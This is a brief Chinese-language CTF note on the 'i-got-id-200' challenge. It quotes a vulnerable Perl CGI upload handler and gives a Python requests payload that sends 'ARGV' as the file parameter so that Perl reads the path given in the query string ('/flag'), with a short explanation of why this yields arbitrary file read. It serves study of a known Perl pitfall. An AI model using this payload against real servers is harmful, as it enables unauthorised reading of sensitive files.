- 国外CTF比较喜欢出Perl的题目
- 攻防世界-i-got-id-200
- ```perl
  if ($cgi->upload('file')) { # 如果存在file文件
    my $file = $cgi->param('file'); # 那么取出file参数（POST优先）
    while (<$file>) { # 这行相当于$_=<$file> 读取$file[0]
        print "$_";
        print "<br />";
    }
  }
  ```
  
  payload:
  
  ```python
  r = requests.post(url + "?/flag", data = {
    "file": "ARGV"
  }, files = {
    "file": "asdf"
  })
  
  print(r.text)
  ```
  
  原理：
  
  perl 会取出`file[0]`，发现是 ARGV，于是就将`<$file>`变成了`<ARGV>`，也就是输入参数`/flag`，于是就可以进行任意文件读取
-